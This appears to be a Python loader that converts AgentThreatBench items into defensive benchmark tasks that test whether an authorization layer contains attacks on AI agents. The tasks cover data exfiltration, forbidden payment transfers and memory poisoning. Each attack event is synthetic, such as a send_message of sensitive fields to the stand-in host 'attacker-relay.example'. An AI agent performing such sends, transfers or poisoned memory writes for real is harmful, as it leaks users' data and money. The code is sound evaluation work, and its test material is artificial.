"""AgentThreatBench loader: the OWASP Agentic Top 10, as executable tasks.

AgentThreatBench operationalises the OWASP Top 10 for Agentic Applications
(2026) and ships in the UK AI Safety Institute's `inspect_evals`. Three
categories with local ground truth, no LLM required to replay:

``data_exfil`` (ASI01)      sensitive values and an explicit authorized-recipient
                            list. This is our egress binding stated in the
                            corpus's own vocabulary, which makes it the cleanest
                            external test of that rung we have.
``autonomy_hijack``         a forbidden-action list, usually an attacker wallet
                            or endpoint the agent must never transact with.
``memory_poison``           a persistent memory store seeded with an attacker
                            marker, where the harm lands on a later turn.

The third is the interesting one, because we have no memory defense at all.
Authorization binds what an action touches, and a poisoned memory is not an
action: it is a fact the agent believes on some future turn. We expect to score
nothing there, and measuring it is how that gap stops being invisible.

Each task is given the mandate the corpus itself implies (authorized recipients
become the trusted egress set, forbidden actions become denied targets), so a
containment result reflects the corpus's notion of correct rather than one we
invented for it.
"""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from benchmarks.core.events import BenchmarkEvent, BenchmarkTask, EventLabel

_CATEGORIES = ("data_exfil", "autonomy_hijack", "memory_poison")


def _mandate(task_id: str, allowed: list[str], denied: list[str],
             category: str) -> dict[str, Any]:
    """The authority the corpus itself implies.

    Memory needs care. An agent that HAS a long-term memory legitimately writes
    to it, so withholding that grant makes a poisoning write fail the path check
    and produces a fake 10-of-10 containment result. Granting it is what makes
    the attack in-surface, which is what it actually is: the write is
    authorized, and the harm is the belief the agent holds on a later turn.
    """
    paths = [f"net:{a}" for a in allowed] + ["records/**"]
    if category == "memory_poison":
        paths.append("memory/**")
    return {
        "mandate_id": f"atb-{task_id}",
        "task": {"summary": "handle the customer request"},
        "scope": {
            "allowed_paths": paths,
            "denied_paths": [f"net:{d}" for d in denied],
            "allowed_operations": ["read", "write", "send", "call"],
        },
    }


def _events(item: dict, category: str, task_id: str) -> list[BenchmarkEvent]:
    """One benign step establishing the task, then the attack step.

    The benign step matters: without it a task is all-attack and contributes no
    false-block signal, and a corpus that can only produce containment numbers
    tells you half of what you need.
    """
    events: list[BenchmarkEvent] = []
    authorized = item.get("authorized_recipients") or []

    if authorized:
        events.append(BenchmarkEvent(
            event_id=f"{task_id}-legit",
            tool_name="send_message", resource="records", action="send",
            label=EventLabel.BENIGN, path=f"net:{authorized[0]}",
            args={"to": authorized[0]}, meta={"category": category},
        ))
    else:
        events.append(BenchmarkEvent(
            event_id=f"{task_id}-legit",
            tool_name="lookup", resource="records", action="read",
            label=EventLabel.BENIGN, path="records/customer",
            args={}, meta={"category": category},
        ))

    if category == "data_exfil":
        # Exfiltration to a recipient outside the authorized list.
        events.append(BenchmarkEvent(
            event_id=f"{task_id}-attack",
            tool_name="send_message", resource="records", action="send",
            label=EventLabel.ATTACK, path="net:attacker-relay.example",
            args={"to": "attacker-relay.example",
                  "body": ",".join(map(str, item.get("sensitive_fields", [])))[:80]},
            meta={"category": category, "owasp": item.get("owasp_id")},
        ))
    elif category == "autonomy_hijack":
        forbidden = (item.get("forbidden_actions") or ["attacker-endpoint"])[0]
        events.append(BenchmarkEvent(
            event_id=f"{task_id}-attack",
            tool_name="transfer", resource="payments", action="send",
            label=EventLabel.ATTACK, path=f"net:{forbidden}",
            args={"destination": forbidden},
            meta={"category": category, "owasp": item.get("owasp_id")},
        ))
    else:
        # Memory poisoning: the write that plants the marker. The harm is the
        # later belief, which no per-action check observes, so this is the only
        # point at which the attack is even visible as an action.
        events.append(BenchmarkEvent(
            event_id=f"{task_id}-attack",
            tool_name="memory_write", resource="memory", action="write",
            label=EventLabel.ATTACK, path="memory/long_term",
            args={"marker": str(item.get("attack_marker", ""))[:40]},
            meta={"category": category, "owasp": item.get("owasp_id")},
        ))
    return events


class AgentThreatBenchLoader:
    name = "agent_threat_bench"

    def __init__(self, data_root: str | Path | None = None) -> None:
        default = (Path(__file__).resolve().parents[2] / ".benchmark-corpus"
                   / "inspect_evals" / "src" / "inspect_evals" / "agent_threat_bench" / "data")
        self.root = Path(data_root) if data_root else default

    def load(self, limit: int | None = None) -> list[BenchmarkTask]:
        if not self.root.exists():
            raise RuntimeError(
                "AgentThreatBench not found. Clone UKGovernmentBEIS/inspect_evals into "
                ".benchmark-corpus/inspect_evals (sparse-checkout src/inspect_evals)."
            )
        tasks: list[BenchmarkTask] = []
        for category in _CATEGORIES:
            path = self.root / f"{category}.json"
            if not path.exists():
                continue
            for item in json.loads(path.read_text()):
                task_id = f"atb-{item.get('id', len(tasks))}"
                allowed = [str(a) for a in (item.get("authorized_recipients") or [])]
                denied = [str(d) for d in (item.get("forbidden_actions") or [])]
                tasks.append(BenchmarkTask(
                    task_id=task_id,
                    summary=f"{category}: {item.get('attack_name', '')}",
                    events=_events(item, category, task_id),
                    mandate=_mandate(task_id, allowed, denied, category),
                    capabilities=[{"resource": r, "action": a}
                                  for r in ("records", "payments", "memory")
                                  for a in ("read", "write", "send", "call")],
                    allowed_tools={"send_message", "lookup", "transfer", "memory_write"},
                    meta={"category": category, "owasp": item.get("owasp_id"),
                          "difficulty": item.get("difficulty")},
                ))
                if limit and len(tasks) >= limit:
                    return tasks
        return tasks
